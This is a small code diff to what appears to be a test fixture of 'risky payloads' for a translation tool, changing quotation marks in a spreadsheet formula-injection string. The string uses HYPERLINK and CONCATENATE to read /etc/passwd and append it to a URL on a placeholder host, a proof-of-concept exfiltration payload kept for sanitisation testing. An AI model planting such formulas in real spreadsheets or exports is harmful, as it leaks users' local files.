@@ -33,7 +33,7 @@ export const riskyPayloads: IntermediateTranslationFormat = {
       translation: 'hyperlink function in excel',
     },
     {
-      term: `=HYPERLINK(CONCATENATE("http://0.0.0.0:80/123.txt?v="; ('file:///etc/passwd'#$passwd.A1)); "test-poc")`,
+      term: `=HYPERLINK(CONCATENATE('http://0.0.0.0:80/123.txt?v='; ('file:///etc/passwd'#$passwd.A1)); 'test-poc')`,
       translation: 'hyperlink concatenate function in csv',
     },
     {
